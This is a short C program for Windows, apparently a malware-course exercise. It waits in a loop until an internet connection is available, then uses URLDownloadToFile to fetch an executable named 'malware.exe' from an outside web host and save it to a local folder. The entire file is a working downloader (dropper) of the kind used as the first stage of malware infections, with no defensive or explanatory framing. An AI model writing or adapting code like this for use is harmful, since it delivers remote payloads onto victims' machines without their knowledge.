#pragma comment(lib, "urlmon.lib")
#pragma comment (lib, "wininet.lib")

#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <tchar.h>
#include <urlmon.h>

int main(void)
{
	int sleepBetweenQueriesInMS = 10000;
	LPDWORD connectionDescription = NULL;
	int isActive = 0;
	isActive = InternetGetConnectedState(connectionDescription, 0);

	while (isActive == 0){

		printf("No active connection, sleeping now for %d seconds\n", (sleepBetweenQueriesInMS / 1000));
		

		Sleep(sleepBetweenQueriesInMS);
		isActive = InternetGetConnectedState(connectionDescription, 0);
	}

	LPCWSTR url = _T("http://students.dsu.edu/DSU/jlschulte14446/malware.exe");
	LPCWSTR filename = _T("C:\\Users\\jens763\\Documents\\CSC432\\malware.exe");

	URLDownloadToFile(NULL, url, filename, 0, NULL);

	return 0;

}



